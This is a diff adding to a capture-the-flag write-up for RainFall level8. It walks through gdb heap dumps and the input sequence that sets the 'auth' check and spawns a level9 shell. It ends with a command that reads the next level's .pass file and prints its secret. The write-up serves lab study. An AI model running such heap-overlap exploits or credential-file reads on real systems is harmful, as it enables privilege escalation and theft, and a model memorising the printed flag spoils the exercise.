@@ -258,3 +258,61 @@ That is how we find out that distance between two globals is 48 bytes.
 	Continuing.
 		0x804a008, (nil)
 		service service
+	(gdb) x/10xw 0x0804a008
+		0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
+		0x804a018:	0x72657320	0x65636976	0x0000000a	0x00020fe1
+		0x804a028:	0x00000000	0x00000000
+	(gdb) x/10xw 0x0804a038
+		0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a058:	0x00000000	0x00000000
+	(gdb) p/x 0x0804a008 + 32
+		$3 = 0x804a028
+
+For `system` we need that byte under address 0x804a028 is not null. Let's do it:
+	
+	(gdb) r
+	The program being debugged has been started already.
+	Start it from the beginning? (y or n) y
+	Starting program: /home/user/level8/level8
+		(nil), (nil)
+		auth
+
+	Breakpoint 3, 0x08048574 in main ()
+	(gdb) x/20xw 0x0804a008
+		0x804a008:	0x000000|0a|	0x00000000	0x00000000	0x00020ff1
+		0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
+
+We put '\n' and it fills in other 15 bytes as well.
+	
+	(gdb) c
+	Continuing.
+		0x804a008, (nil)
+		serviceAAAABBBBCCCCDDDDE
+
+	Breakpoint 3, 0x08048574 in main ()
+	(gdb) x/20xw 0x0804a008
+		0x804a008:	0x000000|0a|	0x00000000	0x00000000	0x00000019
+		0x804a018:	0x41414141	0x42424242	0x43434343	0x44444444
+		0x804a028:	0x0000|0a45|	0x00020fd9	0x00000000	0x00000000
+		0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
+
+Now under 0x804a028 lies 'Е' and under 0x804a029 - '\n'.
+
+# Result
+
+    level8@RainFall:~$ ./level8
+	(nil), (nil)
+	auth
+	0x804a008, (nil)
+	serviceAAAABBBBCCCCDDDDE
+	0x804a008, 0x804a018
+	login
+	$ whoami
+	level9
+	$ cat /home/user/level9/.pass
+	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
